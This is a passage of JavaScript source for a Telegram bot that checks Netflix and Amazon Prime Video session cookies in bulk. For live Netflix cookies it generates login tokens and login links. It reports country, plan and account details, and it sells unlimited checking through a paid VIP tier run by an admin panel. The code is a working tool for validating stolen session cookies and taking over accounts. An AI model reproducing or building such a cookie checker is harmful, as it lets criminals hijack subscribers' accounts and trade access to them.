        `📺 <b>Prime Video Cookie Checker</b>\n${"─".repeat(30)}\n\n📊 ${remaining}\n\n📋 Send Amazon cookies (full cookie string)\n\n📝 <b>Format:</b>\n• One cookie per line (text)\n• 📄 Any file type (.txt, .csv, .json, etc.)\n• 📦 .zip file (auto-extract)\n\n⏳ Each cookie will be checked for:\n✅ Prime subscription\n🌍 Country / Marketplace\n👤 Account info\n\n💡 Send your cookies now or type /cancel`,
        { parse_mode: "HTML" }
      );
    }

    if (data === "admin_stats") {
      if (!isOwner(userId)) return;
      const stats = storage.getStats();
      return bot.sendMessage(chatId,
        `📊 <b>Bot Statistics</b>\n${"─".repeat(25)}\n\n👥 Total Users: ${stats.totalUsers}\n🔍 Checks Today: ${stats.checksToday}\n👑 Active VIPs: ${stats.activeVips}\n🚫 Banned: ${stats.bannedUsers}\n🔗 Total Referrals: ${stats.totalReferrals}`,
        { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "🔙 Admin Panel", callback_data: "admin_panel" }]] } }
      );
    }

    if (data === "admin_panel") {
      if (!isOwner(userId)) return;
      return bot.sendMessage(chatId,
        `🛡️ <b>Admin Panel</b>\n${"─".repeat(30)}`,
        { parse_mode: "HTML", reply_markup: { inline_keyboard: adminMenu() } }
      );
    }

    if (data === "admin_vip") {
      if (!isOwner(userId)) return;
      const users = storage.getAllUsers().filter(u => storage.isVip(u.telegramId));
      let text = `👑 <b>VIP Users</b>\n${"─".repeat(25)}\n\n`;
      if (users.length === 0) {
        text += "No VIP users.";
      } else {
        for (const u of users) {
          const exp = u.vipExpiresAt ? new Date(u.vipExpiresAt).toLocaleDateString() : "Permanent";
          text += `• ${esc(u.firstName)} (@${esc(u.username || "none")}) - ID: <code>${u.telegramId}</code> | Exp: ${exp}\n`;
        }
      }
      text += `\n<b>Commands:</b>\n/vip [user_id] [days] - Grant VIP\n/unvip [user_id] - Remove VIP`;
      return bot.sendMessage(chatId, text, {
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: [[{ text: "🔙 Admin Panel", callback_data: "admin_panel" }]] }
      });
    }

    if (data === "admin_lock_nf") {
      if (!isOwner(userId)) return;
      storage.setNetflixLocked(true);
      return bot.sendMessage(chatId, "🔒 Netflix Checker locked.", {
        reply_markup: { inline_keyboard: [[{ text: "🔙 Admin Panel", callback_data: "admin_panel" }]] }
      });
    }
    if (data === "admin_unlock_nf") {
      if (!isOwner(userId)) return;
      storage.setNetflixLocked(false);
      return bot.sendMessage(chatId, "🔓 Netflix Checker unlocked.", {
        reply_markup: { inline_keyboard: [[{ text: "🔙 Admin Panel", callback_data: "admin_panel" }]] }
      });
    }
    if (data === "admin_lock_prime") {
      if (!isOwner(userId)) return;
      storage.setPrimeLocked(true);
      return bot.sendMessage(chatId, "🔒 Prime Checker locked.", {
        reply_markup: { inline_keyboard: [[{ text: "🔙 Admin Panel", callback_data: "admin_panel" }]] }
      });
    }
    if (data === "admin_unlock_prime") {
      if (!isOwner(userId)) return;
      storage.setPrimeLocked(false);
      return bot.sendMessage(chatId, "🔓 Prime Checker unlocked.", {
        reply_markup: { inline_keyboard: [[{ text: "🔙 Admin Panel", callback_data: "admin_panel" }]] }
      });
    }

    if (data === "nf_token") {
      const config = storage.getConfig();
      if (config.netflixLocked && !isOwner(userId)) {
        return bot.sendMessage(chatId, "🔒 Netflix is currently locked by admin.", {
          reply_markup: { inline_keyboard: [[{ text: "🔙 Main Menu", callback_data: "main_menu" }]] }
        });
      }

      const vip = storage.isVip(String(userId)) || isOwner(userId);
      const used = storage.getDailyChecks(String(userId));
      if (!vip && used >= DAILY_LIMIT) {
        return bot.sendMessage(chatId,
          `⚠️ Daily limit reached (<b>${DAILY_LIMIT}</b>).\n\n👑 Get VIP for unlimited!\nContact: @XK6271`,
          { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "👑 VIP Info", callback_data: "vip_info" }, { text: "🔙 Menu", callback_data: "main_menu" }]] } }
        );
      }

      const remaining = vip ? "♾️ Unlimited" : `${DAILY_LIMIT - used} remaining`;
      pending[userId] = { action: "nf_token_only" };
      return bot.sendMessage(chatId,
        `🔑 <b>NF Token Generator</b>\n${"─".repeat(30)}\n\n📊 ${remaining}\n\n📋 Send Netflix cookies (NetflixId values)\n\n🔑 This mode extracts <b>only the login token</b> — fast and simple!\n\n📝 <b>Format:</b>\n• One cookie per line\n• 📄 File (.txt, .csv, .json)\n• 📦 .zip archive\n\n💡 Send cookies now or /cancel`,
        { parse_mode: "HTML" }
      );
    }

    if (data === "vip_info") {
      const vip = storage.isVip(String(userId));
      let text = `👑 <b>VIP Subscription</b>\n${"─".repeat(30)}\n\n`;
      if (vip) {
        const u = storage.getUser(String(userId));
        const exp = u?.vipExpiresAt ? new Date(u.vipExpiresAt).toLocaleDateString("en-US", { day: "numeric", month: "short", year: "numeric" }) : "♾️ Permanent";
        text += `✅ You are a <b>VIP</b> member!\n📅 Expires: ${exp}\n\n`;
        text += `<b>Benefits:</b>\n• ♾️ Unlimited daily checks\n• ⚡ Priority support\n• 🔑 Full token extraction`;
      } else {
        text += `You are a <b>Free</b> user.\n📊 Daily limit: ${DAILY_LIMIT} checks\n\n`;
        text += `<b>VIP Benefits:</b>\n• ♾️ Unlimited daily checks\n• ⚡ Priority support\n• 🔑 Full token extraction\n\n`;
        text += `📩 To subscribe, contact: @XK6271`;
      }
      return bot.sendMessage(chatId, text, {
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: [[{ text: "🔙 Main Menu", callback_data: "main_menu" }]] }
      });
    }

    if (data === "admin_add_vip") {
      if (!isOwner(userId)) return;
      pending[userId] = { action: "admin_add_vip" };
      return bot.sendMessage(chatId,
        `➕ <b>Add VIP</b>\n\nSend the user ID and days:\n<code>USER_ID DAYS</code>\n\nExample: <code>123456789 30</code>\nFor permanent: <code>123456789</code>\n\nOr type /cancel`,
        { parse_mode: "HTML" }
      );
    }

    if (data === "admin_ban_prompt") {
      if (!isOwner(userId)) return;
      pending[userId] = { action: "admin_ban" };
      return bot.sendMessage(chatId,
        `🚫 <b>Ban User</b>\n\nSend the user ID to ban:\n<code>USER_ID</code>\n\nOr type /cancel`,
        { parse_mode: "HTML" }
      );
    }

    if (data === "admin_users") {
      if (!isOwner(userId)) return;
      const allUsers = storage.getAllUsers();
      const sorted = allUsers.sort((a, b) => new Date(b.joinedAt).getTime() - new Date(a.joinedAt).getTime()).slice(0, 20);
      let text = `👥 <b>Users (${allUsers.length} total)</b>\n${"─".repeat(25)}\n\n`;
      text += `<i>Showing last 20:</i>\n\n`;
      for (const u of sorted) {
        const vipBadge = storage.isVip(u.telegramId) ? " 👑" : "";
        const banBadge = u.isBanned ? " 🚫" : "";
        text += `• ${esc(u.firstName)}${vipBadge}${banBadge} (@${esc(u.username || "none")}) — <code>${u.telegramId}</code>\n`;
      }
      return bot.sendMessage(chatId, text, {
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: [[{ text: "🔙 Admin Panel", callback_data: "admin_panel" }]] }
      });
    }

    if (data === "admin_broadcast") {
      if (!isOwner(userId)) return;
      pending[userId] = { action: "broadcast" };
      return bot.sendMessage(chatId, "📢 Send the broadcast message now (text):\n\nOr /cancel");
    }

    if (data === "admin_unban_prompt") {
      if (!isOwner(userId)) return;
      pending[userId] = { action: "admin_unban" };
      return bot.sendMessage(chatId,
        `✅ <b>Unban User</b>\n\nSend the user ID to unban:\n<code>USER_ID</code>\n\nOr type /cancel`,
        { parse_mode: "HTML" }
      );
    }

    if (data === "admin_banned") {
      if (!isOwner(userId)) return;
      const bannedUsers = storage.getAllUsers().filter(u => u.isBanned);
      let text = `🚫 <b>Banned Users</b>\n${"─".repeat(25)}\n\n`;
      if (bannedUsers.length === 0) {
        text += "No banned users.";
      } else {
        for (const u of bannedUsers) {
          text += `• ${esc(u.firstName)} (@${esc(u.username || "none")}) — <code>${u.telegramId}</code>\n`;
        }
      }
      return bot.sendMessage(chatId, text, {
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: [
          [{ text: "✅ Unban User", callback_data: "admin_unban_prompt" }],
          [{ text: "🔙 Admin Panel", callback_data: "admin_panel" }]
        ] }
      });
    }

    if (data === "admin_referral") {
      if (!isOwner(userId)) return;
      const config = storage.getConfig();
      const stats = storage.getStats();
      let text = `🔗 <b>Referral Settings</b>\n${"─".repeat(25)}\n\n`;
      text += `🎁 <b>Bonus per referral:</b> ${config.referralBonus} checks\n`;
      text += `🔗 <b>Total referrals:</b> ${stats.totalReferrals}\n\n`;
      text += `To change bonus amount, send:\n<code>/setbonus 100</code>`;
      return bot.sendMessage(chatId, text, {
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: [[{ text: "🔙 Admin Panel", callback_data: "admin_panel" }]] }
      });
    }
  });

  bot.on("message", async (msg) => {
    if (!msg.from) return;
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const text = msg.text || "";

    if (text.startsWith("/")) return;

    const userPending = pending[userId];
    if (!userPending) return;

    const user = storage.getUser(String(userId));
    if (!user) return;
    if (user.isBanned) return bot.sendMessage(chatId, "⛔ You are banned.");

    if (CHANNELS.length > 0 && !await checkAllChannels(userId)) {
      return sendJoinMessage(chatId);
    }

    if (userPending.action === "broadcast") {
      if (!isOwner(userId)) return;
      delete pending[userId];
      const allUsers = storage.getAllUsers();
      let sent = 0;
      let failed = 0;
      for (const u of allUsers) {
        try {
          await bot.sendMessage(u.telegramId, text, { parse_mode: "HTML" });
          sent++;
        } catch { failed++; }
      }
      return bot.sendMessage(chatId, `📢 Broadcast complete!\n✅ Sent: ${sent}\n❌ Failed: ${failed}`, {
        reply_markup: { inline_keyboard: [[{ text: "🔙 Admin Panel", callback_data: "admin_panel" }]] }
      });
    }

    if (userPending.action === "admin_add_vip") {
      if (!isOwner(userId)) return;
      delete pending[userId];
      const parts = text.trim().split(/\s+/);
      const targetId = parts[0];
      const days = parts[1] ? parseInt(parts[1]) : undefined;
      if (!targetId || isNaN(Number(targetId))) {
        return bot.sendMessage(chatId, "❌ Invalid user ID.", {
          reply_markup: { inline_keyboard: [[{ text: "🔙 Admin Panel", callback_data: "admin_panel" }]] }
        });
      }
      storage.setVip(targetId, days);
      const targetUser = storage.getUser(targetId);
      const name = targetUser ? `${targetUser.firstName} (@${targetUser.username || "none"})` : targetId;
      return bot.sendMessage(chatId,
        `✅ VIP granted to <b>${esc(name)}</b>\n📅 Duration: ${days ? `${days} days` : "♾️ Permanent"}`,
        { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "🔙 Admin Panel", callback_data: "admin_panel" }]] } }
      );
    }

    if (userPending.action === "admin_ban") {
      if (!isOwner(userId)) return;
      delete pending[userId];
      const targetId = text.trim();
      if (!targetId || isNaN(Number(targetId))) {
        return bot.sendMessage(chatId, "❌ Invalid user ID.", {
          reply_markup: { inline_keyboard: [[{ text: "🔙 Admin Panel", callback_data: "admin_panel" }]] }
        });
      }
      storage.banUser(targetId);
      return bot.sendMessage(chatId, `🚫 User <code>${targetId}</code> has been banned.`, {
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: [[{ text: "🔙 Admin Panel", callback_data: "admin_panel" }]] }
      });
    }

    if (userPending.action === "admin_unban") {
      if (!isOwner(userId)) return;
      delete pending[userId];
      const targetId = text.trim();
      if (!targetId || isNaN(Number(targetId))) {
        return bot.sendMessage(chatId, "❌ Invalid user ID.", {
          reply_markup: { inline_keyboard: [[{ text: "🔙 Admin Panel", callback_data: "admin_panel" }]] }
        });
      }
      storage.unbanUser(targetId);
      return bot.sendMessage(chatId, `✅ User <code>${targetId}</code> has been unbanned.`, {
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: [[{ text: "🔙 Admin Panel", callback_data: "admin_panel" }]] }
      });
    }

    if (userPending.action === "nf_token_only") {
      let cookieText = "";
      if (msg.document) {
        const extracted = await extractFileText(msg);
        if (!extracted) return;
        cookieText = extracted;
      } else {
        cookieText = text;
      }

      const cookies = parseCookiesFromText(cookieText);
      if (cookies.length === 0) {
        return bot.sendMessage(chatId, "❌ No valid cookies found.", { parse_mode: "HTML" });
      }

      const vip = storage.isVip(String(userId)) || isOwner(userId);
      const used = storage.getDailyChecks(String(userId));
      const canCheck = vip ? cookies.length : Math.min(cookies.length, DAILY_LIMIT - used);

      if (canCheck <= 0) {
        delete pending[userId];
        return bot.sendMessage(chatId,
          `⚠️ Daily limit reached. Get VIP!\nContact: @XK6271`,
          { parse_mode: "HTML", reply_markup: { inline_keyboard: mainMenu() } }
        );
      }

      const toCheck = cookies.slice(0, canCheck);
      if (toCheck.length < cookies.length) {
        await bot.sendMessage(chatId, `⚠️ Checking only ${toCheck.length} of ${cookies.length} (daily limit).`);
      }

      cancelled.delete(userId);
      const statusMsg = await bot.sendMessage(chatId,
        `🔑 Generating tokens for <b>${toCheck.length}</b> cookie(s)...\n\n⏳ Please wait...\n\nType /cancel or press button to stop`,
        { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "❌ Cancel", callback_data: "cancel_check" }]] } }
      );

      let hits = 0;
      let dead = 0;
      let stopped = false;

      for (let i = 0; i < toCheck.length; i++) {
        if (cancelled.has(userId)) { stopped = true; cancelled.delete(userId); break; }
        try {
          if (i > 0 && i % 5 === 0) {
            try {
              await bot.editMessageText(
                `🔑 Generating... ${i}/${toCheck.length}\n\n✅ Tokens: ${hits} | ❌ Dead: ${dead}\n\nType /cancel to stop`,
                { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "❌ Cancel", callback_data: "cancel_check" }]] } }
              );
            } catch {}
          }

          const result = await checkNetflixCookie(toCheck[i]);
          if (result.success && result.token) {
            hits++;
            const flag = getCountryFlag(result.country || "");
            const loginUrl = result.loginUrl || `https://netflix.com/account?nftoken=${result.token}`;
            await bot.sendMessage(chatId,
              `🔑 <b>Token #${hits}</b>\n${flag} ${esc(result.countryName || "Unknown")} | ${esc(result.plan || "Unknown")}\n🔗 <a href="${esc(loginUrl)}">Login Link</a>\n<code>${esc(result.token)}</code>`,
              { parse_mode: "HTML", disable_web_page_preview: true }
            );
          } else {
            dead++;
          }
        } catch { dead++; }
      }

      storage.addDailyChecks(String(userId), stopped ? hits + dead : toCheck.length);

      try {
        await bot.editMessageText(
          `${stopped ? "⛔ <b>Cancelled!</b>" : "✅ <b>Token Generation Complete!</b>"}\n${"─".repeat(25)}\n\n📊 Checked: ${hits + dead}/${toCheck.length}\n🔑 Tokens: ${hits}\n❌ Dead: ${dead}`,
          { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "HTML" }
        );
      } catch {}

      delete pending[userId];
      return;
    }

    if (userPending.action === "nf_check") {
      let cookieText = "";

      if (msg.document) {
        const extracted = await extractFileText(msg);
        if (!extracted) return;
        cookieText = extracted;
      } else {
        cookieText = text;
      }

      const cookies = parseCookiesFromText(cookieText);
      if (cookies.length === 0) {
        return bot.sendMessage(chatId, "❌ No valid cookies found.", { parse_mode: "HTML" });
      }

      const vip = storage.isVip(String(userId)) || isOwner(userId);
      const used = storage.getDailyChecks(String(userId));
      const canCheck = vip ? cookies.length : Math.min(cookies.length, DAILY_LIMIT - used);

      if (canCheck <= 0) {
        delete pending[userId];
        return bot.sendMessage(chatId,
          `⚠️ Daily limit reached (${DAILY_LIMIT}). Get VIP for unlimited!\nContact: @XK6271`,
          { parse_mode: "HTML", reply_markup: { inline_keyboard: mainMenu() } }
        );
      }

      const toCheck = cookies.slice(0, canCheck);
      if (toCheck.length < cookies.length) {
        await bot.sendMessage(chatId, `⚠️ Checking only ${toCheck.length} of ${cookies.length} cookies (daily limit).`);
      }

      cancelled.delete(userId);
      const statusMsg = await bot.sendMessage(chatId,
        `🔍 Checking <b>${toCheck.length}</b> Netflix cookie(s)...\n\n⏳ Please wait...\n\nType /cancel to stop`,
        { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "❌ Cancel", callback_data: "cancel_check" }]] } }
      );

      let hits = 0;
      let dead = 0;
      let errors = 0;
      let stopped = false;

      for (let i = 0; i < toCheck.length; i++) {
        if (cancelled.has(userId)) { stopped = true; cancelled.delete(userId); break; }
        try {
          if (i > 0 && i % 5 === 0) {
            try {
              await bot.editMessageText(
                `🔍 Checking... ${i}/${toCheck.length}\n\n✅ Hits: ${hits} | ❌ Dead: ${dead} | ⚠️ Errors: ${errors}\n\nType /cancel to stop`,
                { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "❌ Cancel", callback_data: "cancel_check" }]] } }
              );
            } catch {}
          }

          const result = await checkNetflixCookie(toCheck[i]);

          if (result.success) {
            hits++;
            await bot.sendMessage(chatId, formatNFHit(result, hits), { parse_mode: "HTML", disable_web_page_preview: true });
          } else {
            dead++;
          }
        } catch {
          errors++;
        }
      }

      storage.addDailyChecks(String(userId), stopped ? hits + dead + errors : toCheck.length);

      try {
        await bot.editMessageText(
          `${stopped ? "⛔ <b>Cancelled!</b>" : "✅ <b>Check Complete!</b>"}\n${"─".repeat(25)}\n\n📊 Checked: ${hits + dead + errors}/${toCheck.length}\n✅ Hits: ${hits}\n❌ Dead: ${dead}\n⚠️ Errors: ${errors}`,
          { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "HTML" }
        );
      } catch {}

      delete pending[userId];
      return;
    }

    if (userPending.action === "prime_check") {
      let cookieText = "";

      if (msg.document) {
        const extracted = await extractFileText(msg);
        if (!extracted) return;
        cookieText = extracted;
      } else {
        cookieText = text;
      }

      const cookies = parsePrimeCookiesFromText(cookieText);
      if (cookies.length === 0) {
        return bot.sendMessage(chatId, "❌ No valid cookies found.", { parse_mode: "HTML" });
      }

      const vip = storage.isVip(String(userId)) || isOwner(userId);
      const used = storage.getDailyChecks(String(userId));
      const canCheck = vip ? cookies.length : Math.min(cookies.length, DAILY_LIMIT - used);

      if (canCheck <= 0) {
        delete pending[userId];
        return bot.sendMessage(chatId,
          `⚠️ Daily limit reached (${DAILY_LIMIT}). Get VIP for unlimited!\nContact: @XK6271`,
          { parse_mode: "HTML", reply_markup: { inline_keyboard: mainMenu() } }
        );
      }

      const toCheck = cookies.slice(0, canCheck);
      if (toCheck.length < cookies.length) {
        await bot.sendMessage(chatId, `⚠️ Checking only ${toCheck.length} of ${cookies.length} cookies (daily limit).`);
      }

      cancelled.delete(userId);
      const statusMsg = await bot.sendMessage(chatId,
        `🔍 Checking <b>${toCheck.length}</b> Prime Video cookie(s)...\n\n⏳ Please wait...\n\nType /cancel to stop`,
        { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "❌ Cancel", callback_data: "cancel_check" }]] } }
      );

      let hits = 0;
      let dead = 0;
      let errors = 0;
      let stopped = false;

      for (let i = 0; i < toCheck.length; i++) {
        if (cancelled.has(userId)) { stopped = true; cancelled.delete(userId); break; }
        try {
          if (i > 0 && i % 5 === 0) {
            try {
              await bot.editMessageText(
                `🔍 Checking... ${i}/${toCheck.length}\n\n✅ Hits: ${hits} | ❌ Dead: ${dead} | ⚠️ Errors: ${errors}\n\nType /cancel to stop`,
                { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "❌ Cancel", callback_data: "cancel_check" }]] } }
              );
            } catch {}
          }

          const result = await checkPrimeCookie(toCheck[i]);

          if (result.success && result.isPrime) {
            hits++;
            await bot.sendMessage(chatId, formatPrimeHit(result, hits), { parse_mode: "HTML" });
          } else {
            dead++;
          }
        } catch {
          errors++;
        }
      }

      storage.addDailyChecks(String(userId), stopped ? hits + dead + errors : toCheck.length);

      try {
        await bot.editMessageText(
          `${stopped ? "⛔ <b>Cancelled!</b>" : "✅ <b>Check Complete!</b>"}\n${"─".repeat(25)}\n\n📊 Checked: ${hits + dead + errors}/${toCheck.length}\n✅ Hits: ${hits}\n❌ Dead: ${dead}\n⚠️ Errors: ${errors}`,
          { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "HTML" }
        );
      } catch {}

      delete pending[userId];
      return;
    }
  });

  bot.on("polling_error", (err) => {
    console.error("Bot polling error:", err.message);
  });

  console.log("✅ Checker Bot is running!");
}
